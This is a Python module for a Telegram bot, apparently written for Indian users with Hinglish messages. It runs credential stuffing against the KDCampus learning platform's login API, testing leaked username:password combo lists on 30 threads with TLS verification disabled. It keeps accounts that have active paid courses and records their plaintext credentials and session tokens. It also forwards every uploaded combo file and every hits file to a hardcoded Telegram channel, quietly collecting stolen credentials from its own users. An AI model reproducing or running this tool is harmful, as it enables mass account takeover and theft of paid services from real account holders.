import requests
import hashlib
import os
import time
import asyncio
import logging
import urllib3
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ContextTypes

# Suppress InsecureRequestWarning for cleaner logs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger(__name__)

# --- FAST PARSER (Exact from your script) ---
def parse_combo(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    if '*' in line and ':' not in line:
        parts = line.rsplit('*', 1)
    else:
        parts = line.rsplit(':', 2)
    
    if len(parts) >= 2:
        password = parts[-1].strip()
        username = parts[-2].strip()
        
        if " " in username:
            username = username.split()[-1]
        
        if username.startswith('+91'):
            username = username[3:]
        
        if username.isdigit() and len(username) > 10:
            username = username[-10:]
        
        if username.lower().startswith(('http', 'android', 'com.', 'www.')):
            return None
            
        return username, password
    return None


class Checker:
    # ============ BOT CONFIG ============
    command = "kd"
    name = "KDCampus"
    # ====================================

    async def handle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['awaiting_file_for'] = self.command
        await update.message.reply_text(
            f"📂 <b>{self.name} Ultra-Fast Checker Ready!</b>\n\n"
            f"Ab apna <code>combo.txt</code> file bhejo.\n"
            f"💡 <b>Robust Parse:</b> '+91', URLs, aur garbage text auto-clean honge.\n"
            f"🔐 <b>SHA512 + 2-Step Login:</b> Exact official API logic.\n"
            f"⚠️ <b>Strict Filter:</b> Sirf <b>Active Batches (Days > 0)</b> wale accounts HIT honge.\n"
            f"⚡ <b>No Proxy:</b> 30 Threads ke sath direct ultra-fast connection.\n"
            f"🛑 Beech mein rokna ho toh <code>/stop</code> type kar do.",
            parse_mode="HTML"
        )

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        progress_msg = await update.message.reply_text("⏳ File download kar raha hoon aur check start kar raha hoon...")
        
        file = await update.message.document.get_file()
        
        # ✅ Original filename aur temp path setup
        original_file_name = update.message.document.file_name or "combo.txt"
        temp_input_file = f"temp_input_{update.effective_user.id}_{int(time.time())}.txt"
        await file.download_to_drive(temp_input_file)
        
        with open(temp_input_file, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
            
        total = len(lines)
        if total == 0:
            await progress_msg.edit_text("❌ File khali hai ya valid nahi hai!")
            if os.path.exists(temp_input_file): os.remove(temp_input_file)
            return

        stats = {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []}
        context.user_data[f'stats_{self.command}'] = stats
        context.user_data['stop_checking'] = False

        # ✅ original_file_name bhi pass karo
        asyncio.create_task(self.run_checker(update, context, temp_input_file, original_file_name, lines, total, progress_msg))

    async def run_checker(self, update, context, temp_input_file, original_file_name, lines, total, progress_msg):
        max_workers = 30  # Ultra-fast speed
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            chunk_size = 30  # 30 workers * 30 = har 1-2 second mein progress update!
            
            for i in range(0, total, chunk_size):
                if context.user_data.get('stop_checking', False): break
                
                chunk = lines[i:i+chunk_size]
                futures = [executor.submit(self.check_single, line) for line in chunk]
                
                for future in futures:
                    if context.user_data.get('stop_checking', False): break
                    
                    result = future.result()
                    stats = context.user_data[f'stats_{self.command}']
                    stats['checked'] += 1
                    
                    if result['status'] == 'hit':
                        stats['hits'] += 1
                        stats['hit_details'].append(result['data'])
                    else:
                        stats['failed'] += 1
                
                if context.user_data.get('stop_checking', False): break
                
                stats = context.user_data[f'stats_{self.command}']
                progress_text = (
                    f"🔄 <b>{self.name} Checking...</b>\n\n"
                    f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
                    f"🔥 Active Hits: {stats['hits']}\n"
                    f"❌ Failed/No Batch: {stats['failed']}\n⏳ Remaining: {total - stats['checked']}"
                )
                try:
                    await progress_msg.edit_text(progress_text, parse_mode="HTML")
                except Exception:
                    pass
                
                await asyncio.sleep(0.1)

        # ============ FINAL CLEANUP & SUMMARY ============
        stats = context.user_data.get(f'stats_{self.command}', {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []})
        is_stopped = context.user_data.get('stop_checking', False)
        
        context.user_data.pop('stop_checking', None)
        context.user_data.pop('awaiting_file_for', None)
        context.user_data.pop(f'stats_{self.command}', None)
        
        user_name = update.effective_user.username or f"User_{update.effective_user.id}"
        
        # ✅ APP NAME se filename banao (e.g., "KDCampus.txt")
        app_filename = f"{self.name}.txt"
        
        status_emoji = "🛑" if is_stopped else "🎉"
        status_text = "User dwara STOP kar diya gaya!" if is_stopped else "Checking Completed!"
        
        # ✅ 1. CAPTION FOR USER (NO "👤 User" line here)
        user_caption = (
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Active Hits: {stats['hits']}\n❌ Failed/No Batch: {stats['failed']}"
        )
        
        # ✅ 2. CAPTION FOR LOG - Original File
        log_original_caption = (
            f"🎉 {self.name} Checker\n"
            f"👤 User: @{user_name}"
        )
        
        # ✅ 3. CAPTION FOR LOG - Hits File
        log_hits_caption = (
            f"👤 User: @{user_name}\n\n"
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Active Hits: {stats['hits']}\n❌ Failed/No Batch: {stats['failed']}"
        )
        
        if stats['hits'] > 0:
            hits_temp_file = f"hits_temp_{update.effective_user.id}_{int(time.time())}.txt"
            with open(hits_temp_file, 'w', encoding='utf-8') as f:
                for hit in stats['hit_details']: 
                    f.write(hit + "\n\n")
            
            # ✅ CHANGE 1: Live progress message ko delete kar do
            try:
                await progress_msg.delete()
            except Exception:
                pass
            
            # ✅ CHANGE 2: User ko sirf Hits file bhejo (Filename: KDCampus.txt)
            await update.message.reply_document(
                document=open(hits_temp_file, 'rb'),
                filename=app_filename,  # ✅ APP NAME FILENAME
                caption=user_caption
            )
            
            # ✅ CHANGE 3: Channel me DONO files bhejo
            try:
                # 1. Original File to Channel (Filename: KDCampus.txt)
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=log_original_caption
                )
                # 2. Hits File to Channel (Filename: KDCampus.txt)
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(hits_temp_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=log_hits_caption
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")
                
            if os.path.exists(hits_temp_file):
                os.remove(hits_temp_file)
        else:
            # No hits: notify user (NO file sent back to user)
            await progress_msg.edit_text(
                f"{user_caption}\n\n❌ Koi bhi Active Hit nahi mila.", 
                parse_mode="HTML"
            )
            
            # Optional: Still log the original file to channel even if 0 hits
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=f"{log_original_caption}\n(0 Hits)"
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")

        # ✅ Temporary input file delete karo (End mein)
        if os.path.exists(temp_input_file):
            os.remove(temp_input_file)

    def check_single(self, line):
        parsed = parse_combo(line)
        if not parsed:
            return {'status': 'failed'}
        
        username, password = parsed
        
        try:
            password_hash = hashlib.sha512(password.encode()).hexdigest()
            payload = {
                "code": "", "valid_id": "", "api_key": "kdc123",
                "mobilenumber": username, "password": password_hash
            }
            session = requests.Session()
            session.headers.update({
                "User-Agent": "okhttp/4.10.0",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept": "application/json",
            })
            
            # Step 1: Login
            resp1 = session.post("https://web.kdcampus.live/android/Usersn/login_user", json=payload, timeout=10, verify=False)
            if not resp1.text.strip() or resp1.text.strip().startswith("<!DOCTYPE"):
                session.close()
                return {'status': 'failed'}
            
            try: 
                resp1_json = resp1.json()
            except Exception: 
                session.close()
                return {'status': 'failed'}
            
            data = resp1_json.get("data", {})
            
            # Direct key check
            if data and "id" in data and "connection_key" in data:
                userid = str(data["id"])
                token = str(data["connection_key"])
                name = str(data.get("name", "User"))
            else:
                # Step 2: Two-step login
                valid_id = resp1_json.get("valid_id")
                if valid_id:
                    payload["valid_id"] = valid_id
                    resp2 = session.post("https://web.kdcampus.live/android/Usersn/login_user", json=payload, timeout=10, verify=False)
                    try: 
                        resp2_json = resp2.json()
                    except Exception: 
                        session.close()
                        return {'status': 'failed'}
                    
                    data2 = resp2_json.get("data", {})
                    if data2 and "id" in data2 and "connection_key" in data2:
                        userid = str(data2["id"])
                        token = str(data2["connection_key"])
                        name = str(data2.get("name", "User"))
                    else:
                        session.close()
                        return {'status': 'failed'}
                else:
                    session.close()
                    return {'status': 'failed'}

            # Fetch Courses
            courses = []
            try:
                url = f"https://web.kdcampus.live/android/Dashboard/get_mycourse_data_renew_new/{token}/{userid}/4"
                resp = session.get(url, timeout=10, verify=False)
                if resp.text.strip() and not resp.text.strip().startswith("<!DOCTYPE"):
                    try: 
                        resp_json = resp.json()
                    except Exception: 
                        resp_json = []
                    
                    if isinstance(resp_json, list):
                        for item in resp_json:
                            days = item.get("days_remaining") or item.get("remaining_days") or 0
                            if isinstance(days, str):
                                try:
                                    days = int(days)
                                except:
                                    days = 0
                            
                            # ✅ STRICT FILTER: Sirf ACTIVE batches (days > 0)
                            if days > 0:
                                courses.append({
                                    "batch_id": str(item.get("batch_id", "")),
                                    "batch_name": item.get("batch_name", "Unknown Batch"),
                                })
            except Exception:
                pass
            
            # FAST LOGOUT: Session ko turant close karo
            session.close()

            # ✅ FINAL CHECK: Sirf tab HIT jab active courses > 0
            if courses:
                hit_text = "--------------------------------------------------\n"
                hit_text += f"🔐 Credentials: {username}:{password}\n"
                hit_text += f"🔑 JWT Token: {token}\n\n"
                hit_text += "📚 Courses:\n"
                
                for idx, course in enumerate(courses, 1):
                    hit_text += f"{idx}. ID: {course['batch_id']} | Title: {course['batch_name']}\n"
                
                hit_text += "--------------------------------------------------"
                return {'status': 'hit', 'data': hit_text}
            
            # Login success lekin koi active batch nahi
            return {'status': 'failed'}

        except Exception:
            return {'status': 'failed'}
